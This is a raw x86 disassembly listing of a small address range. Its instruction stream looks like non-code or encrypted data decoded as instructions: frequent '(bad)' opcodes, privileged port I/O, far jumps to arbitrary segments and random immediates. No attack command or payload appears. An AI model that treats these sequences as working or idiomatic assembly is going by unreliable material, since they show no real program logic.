  42b365:	adc    edx,0x19850001
  42b36b:	pop    ebx
  42b36c:	jg     0x42b3be
  42b36e:	add    BYTE PTR [ecx+0x4e],al
  42b371:	xchg   esi,eax
  42b372:	mov    bh,0x5d
  42b374:	xor    BYTE PTR [ebp+ebp*4+0x36c25a9f],ah
  42b37b:	mov    al,ds:0x5e47020a
  42b380:	xor    BYTE PTR ds:0x4e92f1e3,dl
  42b386:	icebp  
  42b387:	cld    
  42b388:	leave  
  42b389:	push   es
  42b38a:	adc    esp,DWORD PTR [edx-0x729e1d91]
  42b390:	pop    eax
  42b391:	mov    edx,0x52e377bc
  42b396:	mov    ecx,0x5acb919f
  42b39b:	rol    DWORD PTR [ebx],cl
  42b39d:	dec    eax
  42b39e:	jmp    0x7d2aab25
  42b3a3:	aad    0x6
  42b3a5:	sar    DWORD PTR [eax],cl
  42b3a7:	inc    esp
  42b3a8:	xor    edi,DWORD PTR [edx-0x23]
  42b3ab:	jg     0x42b421
  42b3ad:	or     BYTE PTR [edi+edi*1-0x5e],al
  42b3b1:	mov    ds:0x22316fcd,al
  42b3b6:	rcl    bl,0x37
  42b3b9:	dec    esp
  42b3ba:	mov    dl,0x62
  42b3bc:	sub    esp,DWORD PTR [ebp+0x67]
  42b3bf:	js     0x42b39b
  42b3c1:	loopne 0x42b41b
  42b3c3:	int3   
  42b3c4:	xchg   DWORD PTR [esi+0x73d5004b],eax
  42b3ca:	mov    ebx,ss
  42b3cc:	sub    DWORD PTR [ebp-0x6a],esi
  42b3cf:	test   edi,edx
  42b3d1:	js     0x42b383
  42b3d3:	bound  ebp,QWORD PTR [edx+edx*8-0x38e8c492]
  42b3da:	inc    edx
  42b3db:	fisubr WORD PTR [edi]
  42b3dd:	(bad)  
  42b3de:	xor    BYTE PTR [esi],al
  42b3e0:	xchg   edx,eax
  42b3e1:	fcom   DWORD PTR [ebx+0x1d616c1e]
  42b3e7:	in     eax,0x95
  42b3e9:	call   0x69d6:0x5d04f58a
  42b3f0:	jmp    0xff6e:0x51c39844
  42b3f7:	cmp    edi,edx
  42b3f9:	mov    edi,0x57b9b7ce
  42b3fe:	scas   eax,DWORD PTR es:[edi]
  42b3ff:	loop   0x42b44d
  42b401:	jl     0x42b440
  42b403:	stos   BYTE PTR es:[edi],al
  42b404:	fild   QWORD PTR [esi-0x6e]
  42b407:	test   edx,edx
  42b409:	sub    esp,DWORD PTR [edx-0x2d5353f0]
  42b40f:	test   eax,0x0
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   ebp,eax
  42b481:	or     cl,BYTE PTR [edx-0x2c]
  42b484:	ror    dh,0x1
  42b487:	add    BYTE PTR [ecx+eax*1],al
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	scas   eax,DWORD PTR es:[edi]
  42b48d:	bound  eax,QWORD PTR [ecx+0xbf6e04b]
  42b493:	stos   DWORD PTR es:[edi],eax
  42b494:	jns    0x42b4b7
  42b496:	sub    DWORD PTR [ecx-0x77286e8d],esp
  42b49c:	shl    DWORD PTR [esi-0xa],0x92
  42b4a0:	pop    ecx
  42b4a1:	retf   
  42b4a2:	mov    eax,fs:0x1528f99c
  42b4a8:	outs   dx,BYTE PTR ds:[esi]
  42b4a9:	and    edi,ebp
  42b4ab:	jnp    0x42b515
  42b4ad:	mov    dh,0x1a
  42b4af:	jmp    0x907551f3
  42b4b4:	sub    BYTE PTR [edx-0x1],ah
  42b4b7:	ins    DWORD PTR es:[edi],dx
  42b4b8:	jmp    0x42b45a
  42b4ba:	or     ah,BYTE PTR [edx+eiz*1+0x66]
  42b4be:	jb     0x42b461
  42b4c0:	or     bh,ah
  42b4c2:	cli    
  42b4c3:	add    dh,BYTE PTR [esp+edx*8-0x4b]
  42b4c7:	cmp    bl,BYTE PTR [eax-0x5a]
  42b4ca:	out    dx,al
  42b4cb:	idiv   DWORD PTR [eax]
  42b4cd:	popa   
  42b4ce:	cwde   
  42b4cf:	into   
  42b4d0:	(bad)  
  42b4d1:	and    eax,0x5eb74178
  42b4d6:	xchg   esp,eax
  42b4d7:	and    al,0xa6
  42b4d9:	dec    ebp
  42b4da:	sbb    al,bh
  42b4dc:	add    ch,BYTE PTR [esi+0x1ddfb55e]
  42b4e2:	(bad)  
  42b4e3:	cmc    
  42b4e4:	adc    BYTE PTR [ebp+0xe1794eb],bl
  42b4ea:	enter  0x40b3,0x53
  42b4ee:	jmp    0x3c17:0x4da4d44a
  42b4f5:	sbb    DWORD PTR [esi-0x2e795109],ebx
  42b4fb:	call   0x958:0x5aceffb0
  42b502:	inc    esp
  42b503:	sbb    eax,0x7330cc5e
  42b508:	dec    eax
  42b509:	mov    ebx,0x23cf3850
  42b50e:	jecxz  0x42b520
  42b510:	mov    bh,0x30
  42b512:	sub    al,0xb5
  42b514:	mov    eax,ds:0x597021b8
  42b519:	out    dx,eax
  42b51a:	sub    eax,0xe8c27883
  42b51f:	lods   al,BYTE PTR ds:[esi]
  42b520:	mov    BYTE PTR [ecx-0x48],bh
  42b523:	ror    eax,cl
  42b525:	fisub  DWORD PTR fs:[ecx-0x13bf8c5a]
  42b52c:	(bad)  
  42b52d:	jns    0x42b5aa
  42b52f:	jb     0x42b4b3
  42b531:	cs xor al,0xfd
  42b534:	js     0x42b4f4
  42b536:	jecxz  0x42b583
  42b538:	cwde   
  42b539:	adc    eax,0x5909ce64
  42b53e:	(bad)  
  42b540:	cmp    eax,0x65fd0c3a
  42b545:	mov    dh,BYTE PTR [edi-0xa32c8bf]
  42b54b:	sub    ebp,DWORD PTR [ebp+0x73f43d31]
  42b551:	sbb    bh,BYTE PTR [esi+0x1adb946f]
  42b557:	lahf   
  42b558:	in     al,0xa7
  42b55a:	sar    DWORD PTR [ebp+0x76fc36e],cl
  42b560:	and    ch,BYTE PTR [edx+0x335d7882]
  42b566:	ins    BYTE PTR es:[edi],dx
  42b567:	or     al,0xcd
  42b569:	cli    
  42b56a:	mov    eax,0xb465c4
  42b56f:	fisub  DWORD PTR [edx-0xf]
  42b572:	add    al,0xf6
  42b574:	add    al,0xa9
  42b576:	mov    eax,0x4699abc5
  42b57b:	push   ebx
  42b57c:	ret    0xd15c
  42b57f:	mov    esp,0x2842ba08
  42b584:	xlat   BYTE PTR ds:[ebx]
  42b585:	pop    ss
  42b586:	mov    DWORD PTR [esi+0x5b],ebx
  42b589:	cmp    edx,DWORD PTR [edx-0x71364e90]
  42b58f:	mov    al,0x0
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	jno    0x42b5e2
  42b602:	adc    BYTE PTR [edi+0x1cfc4],al
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	aaa    
  42b60d:	sub    DWORD PTR [eax],0xcd723c70
  42b613:	inc    ebp
  42b614:	into   
  42b615:	add    al,0x54
  42b617:	rcr    DWORD PTR [bx-0x1f],1
  42b61b:	pop    ebx
  42b61c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b61d:	pop    esi
  42b61e:	idiv   esi
  42b620:	call   0x71e8:0xab117441
  42b627:	int    0x5
  42b629:	sar    DWORD PTR [ecx],1
  42b62b:	out    dx,eax
  42b62c:	gs sbb dl,bh
  42b62f:	loopne 0x42b5ce
  42b631:	nop
  42b632:	je     0x42b634
  42b634:	mov    ah,0xd9
  42b636:	fsub   QWORD PTR [edi]
  42b638:	ja     0x42b611
  42b63a:	cmp    DWORD PTR [eax+0x37],esp
  42b63d:	pop    ebx
  42b63e:	jl     0x42b689
  42b640:	cdq    
  42b641:	mov    cl,BYTE PTR [eax-0x67]
  42b644:	out    0x98,al
  42b646:	xor    BYTE PTR [edx],cl
  42b648:	sub    bl,BYTE PTR [edi]
  42b64a:	adc    eax,DWORD PTR [edx]
  42b64c:	int3   
  42b64d:	xor    ecx,ebx
  42b64f:	inc    ebp
  42b650:	aas    
  42b651:	add    DWORD PTR [eax+0x7c],esi
  42b654:	mov    bh,BYTE PTR [ebx+ebx*2+0x44]
  42b658:	mov    ds:0xb9ec52c1,eax
  42b65d:	jmp    0x42b5f5
  42b65f:	xchg   edx,eax
  42b660:	push   0xcbd3bfad
  42b665:	or     cl,dh
  42b667:	add    al,0x54
  42b669:	and    al,0x54
  42b66b:	aaa    
  42b66c:	xor    DWORD PTR [esi+ecx*2-0x22],0x2f
  42b671:	test   BYTE PTR [ebx+0x651a64fd],dl
  42b677:	push   ebp
  42b678:	nop
  42b679:	or     edx,DWORD PTR [eax-0x62]
  42b67c:	jne    0x42b600
  42b67e:	pusha  
  42b67f:	ficom  DWORD PTR [eax+edx*8-0x535ca2ff]
  42b686:	cmp    dl,dh
  42b688:	test   BYTE PTR [esi+0x15],bl
  42b68b:	add    ecx,ebx
  42b68d:	xor    al,0xe7
  42b68f:	jmp    0x42b624
  42b691:	or     al,BYTE PTR [esi+0x3c52e2a9]
  42b697:	dec    ecx
  42b698:	cmp    BYTE PTR [edi+edx*4-0x73],bl
  42b69c:	push   esp
  42b69d:	fucom  st(6)
  42b69f:	js     0x42b658
  42b6a1:	pop    edx
  42b6a2:	lahf   
  42b6a3:	sub    ebp,DWORD PTR [edi+esi*8+0x73]
  42b6a7:	jmp    0x42b662
  42b6a9:	sbb    bp,WORD PTR [edi]
  42b6ac:	(bad)  
  42b6ad:	mov    esp,0xaad55123
  42b6b2:	ret    
  42b6b3:	jecxz  0x42b6c6
  42b6b5:	or     esi,DWORD PTR [edx-0x6c]
  42b6b8:	jecxz  0x42b693
  42b6ba:	(bad)  
  42b6bb:	fisub  WORD PTR [edx+ebp*1-0x79]
  42b6bf:	and    BYTE PTR [ebp+0x3e],dh
  42b6c2:	cmp    BYTE PTR [edx-0x48],dl
  42b6c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6c6:	dec    ebp
  42b6c7:	das    
  42b6c8:	loop   0x42b680
  42b6ca:	xor    BYTE PTR [edi+0x7e],bh
  42b6cd:	fadd   st(0),st
  42b6cf:	sub    DWORD PTR [ebx],0xffffffe5
  42b6d2:	gs sbb dl,dh
  42b6d5:	jmp    0x42b6b2
  42b6d7:	jecxz  0x42b6ba
  42b6d9:	and    al,0x56
  42b6db:	or     BYTE PTR [ebp+0x34],ch
  42b6de:	sbb    ebp,DWORD PTR [edx]
  42b6e0:	adc    al,0xbe
  42b6e2:	adc    edi,DWORD PTR [ebx+0x4f]
  42b6e5:	lods   eax,DWORD PTR ds:[esi]
  42b6e6:	lods   eax,DWORD PTR ds:[esi]
  42b6e7:	mov    ah,0x39
  42b6e9:	fidiv  DWORD PTR [ebp+0x15]
  42b6ec:	jbe    0x42b6a3
  42b6ee:	mov    ch,0xea
  42b6f0:	(bad)  
  42b6f1:	out    dx,eax
  42b6f2:	test   BYTE PTR [edx],al
  42b6f4:	mov    BYTE PTR [ecx+0x125b8b09],cl
  42b6fa:	sub    DWORD PTR [edx+0x28],edx
  42b6fd:	aad    0x57
  42b6ff:	call   0x408:0x832f06f7
  42b706:	out    dx,al
  42b707:	mov    ebx,0xd393dc3d
  42b70c:	jmp    0x42b70c
  42b70e:	scas   eax,DWORD PTR es:[edi]
  42b70f:	call   0x0:0x0
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	out    0x44,eax
  42b782:	add    al,0x62
  42b784:	enter  0x1d0,0x0
  42b788:	add    al,0x1
  42b78a:	add    BYTE PTR [eax],al
  42b78c:	pop    eax
  42b78d:	dec    ecx
  42b78e:	es retf 0xcb41
  42b792:	push   cs
  42b793:	xchg   ecx,eax
  42b794:	data16 adc al,0x7b
  42b797:	rcr    DWORD PTR [esi+edx*2+0x7cbd2349],1
  42b79e:	mov    esp,0x1351bc57
  42b7a3:	adc    cl,BYTE PTR [edx+0x5c010c29]
  42b7a9:	xor    al,0x83
  42b7ab:	cli    
  42b7ac:	mov    es,WORD PTR [ebx+0x15]
  42b7af:	pop    ds
  42b7b0:	imul   DWORD PTR [esi]
  42b7b2:	inc    eax
  42b7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7b4:	and    ebx,DWORD PTR [edi-0x707e4135]
  42b7ba:	in     al,dx
  42b7bb:	mov    al,ds:0x7cc83928
  42b7c0:	fldpi  
  42b7c2:	dec    ebx
  42b7c3:	cs pushf 
  42b7c5:	hlt    
  42b7c6:	es mov dh,0x81
  42b7ca:	push   eax
  42b7cb:	arpl   WORD PTR [esi+esi*1-0x7c],bp
  42b7cf:	mov    ds:0x1ab41303,al
  42b7d4:	je     0x42b787
  42b7d6:	(bad)  
  42b7d9:	out    0xfd,al
  42b7db:	mov    eax,ds:0x61f07770
  42b7e0:	les    ebx,FWORD PTR [edi-0x36]
  42b7e3:	add    al,0x6b
  42b7e5:	aad    0xe7
  42b7e7:	push   cs
  42b7e8:	bound  eax,QWORD PTR [eax+0x49]
  42b7eb:	add    cl,BYTE PTR [eax]
  42b7ed:	pavgb  mm4,mm1
  42b7f0:	and    eax,0x9125007d
  42b7f5:	push   ds
  42b7f6:	popa   
  42b7f7:	sub    esi,DWORD PTR [edx]
  42b7f9:	push   cs
  42b7fa:	pushf  
  42b7fb:	mov    esp,DWORD PTR [eax-0x58]
  42b7fe:	mov    eax,0xe0c48c4e
  42b803:	lods   eax,DWORD PTR ds:[esi]
  42b804:	xchg   BYTE PTR [eax-0x7f],bh
  42b807:	pop    ds
  42b808:	xor    eax,DWORD PTR [ebx]
  42b80a:	mov    edi,0xe15f007f
  42b80f:	sub    ebp,DWORD PTR [eax-0x7b]
  42b812:	(bad)  
  42b814:	mov    ah,0xec
  42b816:	mov    ds:0x5e569576,eax
  42b81b:	enter  0xa0f4,0xce
  42b81f:	adc    eax,0x3dbf5b4a
  42b824:	(bad)  
  42b826:	fmul   QWORD PTR [esi-0x38e9e6c6]
  42b82c:	pushf  
  42b82d:	ret    
  42b82e:	out    dx,al
  42b82f:	and    eax,0xc754653e
  42b834:	push   es
  42b835:	xchg   esp,eax
  42b836:	sub    bl,ah
  42b838:	stos   BYTE PTR es:[edi],al
  42b839:	sahf   
  42b83a:	dec    ebp
  42b83b:	aaa    
  42b83c:	les    ebx,FWORD PTR [eax+0x468d685a]
  42b842:	sub    al,0x2e
  42b844:	pop    edx
  42b845:	sub    DWORD PTR [ecx+0x792d33cd],edx
  42b84b:	cld    
  42b84c:	or     ebp,DWORD PTR [eax+0x7311f752]
  42b852:	cmp    dl,BYTE PTR [eax]
  42b854:	mov    ch,0xcb
  42b856:	std    
  42b857:	std    
  42b858:	sub    al,0xce
  42b85a:	dec    esp
  42b85b:	add    DWORD PTR [edx-0x49],esi
  42b85e:	dec    esp
  42b85f:	jge    0x42b8d5
  42b861:	jp     0x42b8c0
  42b863:	retf   
  42b864:	(bad)  
  42b865:	pop    edi
  42b866:	mov    ds:0x86118d5e,eax
  42b86b:	sub    DWORD PTR [esp+ecx*8+0x54491e8a],ecx
  42b872:	push   esp
  42b873:	loopne 0x42b86f
  42b875:	sub    dh,BYTE PTR [edi]
  42b877:	xchg   ecx,eax
  42b878:	jne    0x42b87b
  42b87a:	and    eax,0x4ad6657
  42b87f:	cwde   
  42b880:	push   ebp
  42b881:	test   eax,0x4c213a4a
  42b886:	(bad)  [ecx]
  42b888:	mov    ds:0xe390c01,eax
  42b88d:	sahf   
  42b88e:	push   ebx
  42b88f:	add    al,0x0
	...
  42b8f1:	add    BYTE PTR [eax],al
  42b8f3:	add    al,ch
  42b8f5:	popf   
  42b8f6:	mov    esi,0xf9e7ffe7
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ecx,DWORD PTR [ecx+0x35]
  42b902:	stc    
  42b903:	push   edx
  42b904:	int3   
  42b905:	rol    DWORD PTR [ecx],1
  42b907:	add    BYTE PTR [ecx+eax*1],al
  42b90a:	add    BYTE PTR [eax],al
  42b90c:	les    ebp,FWORD PTR [esi+0xaaa7382]
  42b912:	data16 xor bh,dh
  42b915:	adc    DWORD PTR [edi+edi*1],esp
  42b918:	jecxz  0x42b998
  42b91a:	dec    edx
  42b91b:	repz div BYTE PTR [ebx+0x42]
  42b91f:	das    
  42b920:	sub    al,0x9
  42b922:	jg     0x42b98a
  42b924:	loope  0x42b951
  42b926:	gs into 
  42b928:	or     eax,0xc51704b3
  42b92d:	popf   
  42b92e:	xor    ah,BYTE PTR [ecx+0x64]
  42b931:	push   edx
  42b932:	sbb    ch,BYTE PTR [esp+ebp*4]
  42b935:	xor    BYTE PTR [esi+0x39],dl
  42b938:	dec    DWORD PTR [eax]
  42b93a:	mov    eax,0x6f094636
  42b93f:	push   ss
  42b940:	jbe    0x42b8d1
  42b942:	neg    DWORD PTR [esi+0x3f103338]
  42b948:	push   ebp
  42b949:	lods   eax,DWORD PTR ds:[esi]
  42b94a:	jmp    DWORD PTR [ecx]
  42b94c:	push   edi
  42b94d:	fadd   st(0),st
  42b94f:	dec    ebp
  42b950:	pop    ebx
  42b951:	xor    al,0x5
  42b953:	aad    0xa0
  42b955:	and    al,0x1f
  42b957:	jnp    0x42b9ab
  42b959:	ds js  0x42b9c5
  42b95c:	jno    0x42b94e
  42b95e:	sbb    DWORD PTR [edx+0x1fd84f1d],esp
  42b964:	hlt    
  42b965:	clc    
  42b966:	cs add BYTE PTR ds:[ecx+edx*8],bh
  42b96b:	ficomp DWORD PTR [eax+0x12ea2f95]
  42b971:	or     ecx,DWORD PTR [edx]
  42b973:	loopne 0x42b987
  42b975:	mov    esp,0x720a3dda
  42b97a:	in     al,dx
  42b97b:	mov    ebx,0xdc37b08c
  42b980:	dec    ecx
  42b981:	xor    DWORD PTR [ecx+0x40],esi
  42b984:	xor    bh,bl
  42b986:	iret   
  42b987:	mov    eax,ds:0x6c6f04cb
  42b98c:	sahf   
  42b98d:	mov    al,ds:0x5de0a503
  42b992:	inc    esp
  42b993:	push   ss
  42b994:	fnstenv [edx+0x47]
  42b997:	ja     0x42b9e6
  42b999:	imul   eax,DWORD PTR [edi+ebp*1-0x1],0x38
  42b99e:	push   ecx
  42b99f:	cmc    
  42b9a0:	sbb    al,0x42
  42b9a2:	jmp    0x42b96d
  42b9a4:	jbe    0x42ba1e
  42b9a6:	aas    
  42b9a7:	fiadd  WORD PTR [esi-0x6a]
  42b9aa:	mov    edx,0x307bf5e2
  42b9af:	xchg   BYTE PTR [edi+0x10beb99b],dh
  42b9b5:	test   BYTE PTR [eax+esi*2+0x5e],0xd6
  42b9ba:	xchg   ebp,eax
  42b9bb:	dec    ebp
  42b9bc:	pop    es
  42b9bd:	push   ds
  42b9be:	stc    
  42b9bf:	loopne 0x42b9ba
  42b9c1:	push   esi
  42b9c2:	xor    BYTE PTR [esi],ch
  42b9c4:	jmp    0x42b9ea
  42b9c6:	mov    ecx,0xc2ca643e
  42b9cb:	jns    0x42b9f5
  42b9cd:	nop
  42b9ce:	sbb    DWORD PTR [eax],eax
  42b9d0:	es mov ah,0xc9
  42b9d3:	in     eax,0xac
  42b9d5:	leave  
  42b9d6:	dec    ebx
  42b9d7:	(bad)  
  42b9d8:	mov    gs,WORD PTR [ebx]
  42b9da:	cmp    bh,BYTE PTR [edi-0x14]
  42b9dd:	jae    0x42b9d6
  42b9df:	loopne 0x42ba60
  42b9e1:	sbb    eax,0x96481e25
  42b9e6:	fdivr  QWORD PTR [eax]
  42b9e8:	xchg   edx,eax
  42b9e9:	std    
  42b9ea:	and    DWORD PTR [edx+0x347ac98],eax
  42b9f0:	retf   0x972e
  42b9f3:	sub    al,0xb1
  42b9f5:	push   edi
  42b9f6:	mov    bl,ah
  42b9f8:	ds clc 
  42b9fa:	mov    WORD PTR [ecx],?
  42b9fc:	lahf   
  42b9fd:	jecxz  0x42ba7a
  42b9ff:	popa   
  42ba00:	hlt    
  42ba01:	sub    eax,0xa89dc2c4
  42ba06:	sahf   
  42ba07:	mov    ds:0xc9721240,al
  42ba0c:	std    
  42ba0d:	push   ss
  42ba0e:	aaa    
  42ba0f:	ja     0x42ba11
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     esi,ebp
  42ba81:	lods   eax,DWORD PTR ds:[esi]
  42ba82:	mov    ch,dl
  42ba84:	rcl    dl,1
  42ba86:	add    DWORD PTR [eax],eax
  42ba88:	add    al,0x1
  42ba8a:	add    BYTE PTR [eax],al
  42ba8c:	pop    edi
  42ba8d:	push   es
  42ba8e:	jge    0x42bade
  42ba90:	je     0x42ba64
  42ba92:	push   esi
  42ba93:	adc    DWORD PTR [eax+0x6ca17c87],edi
  42ba99:	cwde   
  42ba9a:	data16 sbb cl,BYTE PTR [esi+0x157ee24a]
  42baa1:	push   0x580a60ec
  42baa6:	add    eax,0xf1db2c3a
  42baab:	xchg   edi,eax
  42baac:	cmc    
  42baad:	xchg   ecx,eax
  42baae:	sbb    esp,DWORD PTR [edx+0x3c1b39a]
  42bab4:	or     BYTE PTR [esi],bl
  42bab6:	loopne 0x42ba44
  42bab8:	cmp    DWORD PTR [ecx+0x41935d5c],esi
  42babe:	imul   ebx,DWORD PTR [ebx+esi*1+0x3299e95],0xee7259a0
  42bac9:	pop    ds
  42baca:	rcl    DWORD PTR [eax+ebp*4-0x26c1c1e8],cl
  42bad1:	ss sub al,0xad
  42bad4:	push   edi
  42bad5:	in     al,0xb0
  42bad7:	std    
  42bad8:	xchg   ebx,eax
  42bad9:	(bad)  
  42bada:	push   edx
  42badb:	mov    ds:0x83852bf3,al
  42bae0:	cwde   
  42bae1:	daa    
  42bae2:	inc    ebp
  42bae3:	neg    BYTE PTR [ebp+eiz*8-0xe]
  42bae7:	int    0xf4
  42bae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42baea:	fnstenv [eax]
  42baec:	fwait
  42baed:	out    dx,eax
  42baee:	ret    0xfd9c
  42baf1:	shl    DWORD PTR [ebp+0x1b],cl
  42baf4:	jno    0x42bb23
  42baf6:	pop    ds
  42baf7:	jae    0x42bb2c
  42baf9:	and    eax,0xd1f06370
  42bafe:	jbe    0x42bb3b
  42bb00:	ffree  st(1)
  42bb02:	inc    esp
  42bb03:	push   0xe76b47c4
  42bb08:	ss cmp ebp,esi
  42bb0b:	cmp    ch,BYTE PTR [esi+0x41673b82]
  42bb11:	push   0xffffff88
  42bb13:	test   ah,dh
  42bb15:	xor    ah,0x76
  42bb18:	pop    es
  42bb19:	dec    edi
  42bb1a:	call   0x57971f8
  42bb1f:	dec    edi
  42bb20:	popa   
  42bb21:	xor    eax,0x82e0d691
  42bb26:	dec    ebp
  42bb27:	sysret 
  42bb29:	popa   
  42bb2a:	inc    ecx
  42bb2b:	sub    cl,BYTE PTR [esi]
  42bb2d:	retf   
  42bb2e:	cwde   
  42bb2f:	call   0xff97a246
  42bb34:	hlt    
  42bb35:	add    ebp,edi
  42bb37:	inc    esp
  42bb38:	dec    edx
  42bb39:	bnd jge 0x42bb38
  42bb3c:	fadd   QWORD PTR [edi]
  42bb3e:	pop    es
  42bb3f:	scas   eax,DWORD PTR es:[edi]
  42bb40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb41:	sti    
  42bb42:	addr16 cmc 
  42bb44:	cmp    esi,DWORD PTR [ebp-0x61]
  42bb47:	inc    ebp
  42bb48:	mov    ch,0x6a
  42bb4a:	sbb    al,0x66
  42bb4c:	jg     0x42bb5e
  42bb4e:	mov    esi,0x333a86d2
  42bb53:	push   esi
  42bb54:	in     al,0xa6
  42bb56:	std    
  42bb57:	loopne 0x42baf8
  42bb59:	sbb    eax,0xc23b7b21
  42bb5e:	ret    
  42bb5f:	in     eax,dx
  42bb60:	int3   
  42bb61:	jno    0x42bbd1
  42bb63:	pusha  
  42bb64:	in     al,0x78
  42bb66:	clc    
  42bb67:	pushf  
  42bb68:	pop    es
  42bb69:	sti    
  42bb6a:	inc    esi
  42bb6b:	or     DWORD PTR [ebx-0xc],edi
  42bb6e:	retf   
  42bb6f:	sub    BYTE PTR [ebx-0x1f],dl
  42bb72:	xor    al,0x85
  42bb74:	cmp    BYTE PTR [ebx-0x4723b8a7],dl
  42bb7a:	repz (bad) 
  42bb7c:	mov    ebx,ebp
  42bb7e:	inc    sp
  42bb80:	(bad)  
  42bb82:	adc    ecx,DWORD PTR [ebx-0x4c]
  42bb85:	int    0xec
  42bb87:	mov    fs,WORD PTR [esi-0x70c4c7cb]
  42bb8d:	sub    al,dl
  42bb8f:	jp     0x42bb91
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	retf   0x511e
  42bc03:	rcl    esp,cl
  42bc05:	rol    DWORD PTR [ecx],cl
  42bc07:	add    BYTE PTR [ecx+eax*1],al
  42bc0a:	add    BYTE PTR [eax],al
  42bc0c:	add    al,cl
  42bc0e:	mov    ebp,0x5552f605
  42bc13:	xchg   ecx,eax
  42bc14:	inc    ebx
  42bc15:	push   ss
  42bc16:	jno    0x42bc8f
  42bc18:	cs cmp al,0x48
  42bc1b:	mov    eax,ds:0xd2d9e9f9
  42bc20:	adc    DWORD PTR [ebp+0x303f019e],ecx
  42bc26:	ins    BYTE PTR es:[edi],dx
  42bc27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc28:	repnz cmp BYTE PTR [ebx-0x1f],bl
  42bc2c:	popf   
  42bc2d:	das    
  42bc2e:	out    0x46,eax
  42bc30:	test   DWORD PTR [ebx],ebp
  42bc32:	rcr    BYTE PTR [edi+eiz*2],0x83
  42bc36:	cli    
  42bc37:	aaa    
  42bc38:	fucomi st,st(0)
  42bc3a:	adc    DWORD PTR [eax-0x175d5675],0x7754841c
  42bc44:	mov    ah,0xa8
  42bc46:	pop    ebp
  42bc47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bc49:	dec    esp
  42bc4a:	int3   
  42bc4b:	gs xchg edx,eax
  42bc4d:	inc    eax
  42bc4e:	ss jmp 0xf17a:0x22ced3bd
  42bc56:	pushf  
  42bc57:	push   ebp
  42bc58:	cmp    BYTE PTR [ebp+edi*4-0x4f],cl
  42bc5c:	sub    eax,0x6a0658d7
  42bc61:	iret   
  42bc62:	fstp   st(5)
  42bc64:	leave  
  42bc65:	xchg   DWORD PTR [eax+edx*1],ecx
  42bc68:	ins    DWORD PTR es:[edi],dx
  42bc69:	xchg   edi,eax
  42bc6a:	les    eax,FWORD PTR [esi-0x6d]
  42bc6d:	js     0x42bca4
  42bc6f:	and    esp,DWORD PTR [esi+0x5b]
  42bc72:	addr16 (bad) 
  42bc74:	fcmovbe st,st(6)
  42bc76:	xor    ecx,0xffffffa0
  42bc79:	fisub  WORD PTR [edi+0x7f]
  42bc7c:	daa    
  42bc7d:	popa   
  42bc7e:	jmp    0x7f82:0xd1146aa8
  42bc85:	jno    0x42bc60
  42bc87:	fldcw  WORD PTR [ebx]
  42bc89:	pop    ebp
  42bc8a:	out    dx,eax
  42bc8b:	jp     0x42bc3d
  42bc8d:	adc    DWORD PTR [esi-0x436eeea6],0x5f
  42bc94:	sbb    DWORD PTR [ebx-0x7aaac52e],ebx
  42bc9a:	fild   WORD PTR [ebx]
  42bc9c:	ins    BYTE PTR es:[edi],dx
  42bc9d:	mov    al,ds:0x8acdf87e
  42bca2:	and    DWORD PTR [esp+esi*1+0x4d],esi
  42bca6:	test   eax,0x7191bdb1
  42bcab:	(bad)
  42bcaf:	xchg   esi,eax
  42bcb0:	cmp    eax,DWORD PTR [ecx-0x17]
  42bcb3:	dec    edx
  42bcb4:	cmp    al,BYTE PTR [edi-0x27]
  42bcb7:	mov    ch,0x11
  42bcb9:	arpl   WORD PTR [edi+0x1343024b],sp
  42bcbf:	rcr    ebp,1
  42bcc1:	test   al,0x95
  42bcc3:	mov    ebp,DWORD PTR [esi+0x1e]
  42bcc6:	loop   0x42bd34
  42bcc8:	shr    BYTE PTR [ecx-0x3f],1
  42bccb:	mov    esp,0x4767817e
  42bcd0:	xor    BYTE PTR [eax+0xb],bl
  42bcd3:	xchg   edi,eax
  42bcd4:	ret    0x7dae
  42bcd7:	mov    eax,ds:0x10f5ad7b
  42bcdc:	inc    eax
  42bcdd:	pop    edi
  42bcde:	fisubr DWORD PTR [edi-0x10]
  42bce1:	out    0x9f,eax
  42bce3:	mul    DWORD PTR [edi-0x49cffd0e]
  42bce9:	inc    ebx
  42bcea:	test   eax,0x64cf2355
  42bcef:	cs jle 0x42bcc6
  42bcf2:	xor    dl,cl
  42bcf4:	sti    
  42bcf5:	jl     0x42bcbc
  42bcf7:	test   al,0x4d
  42bcf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bcfa:	jge    0x42bd6f
  42bcfc:	adc    DWORD PTR [ecx+0x38864fcf],0x5a
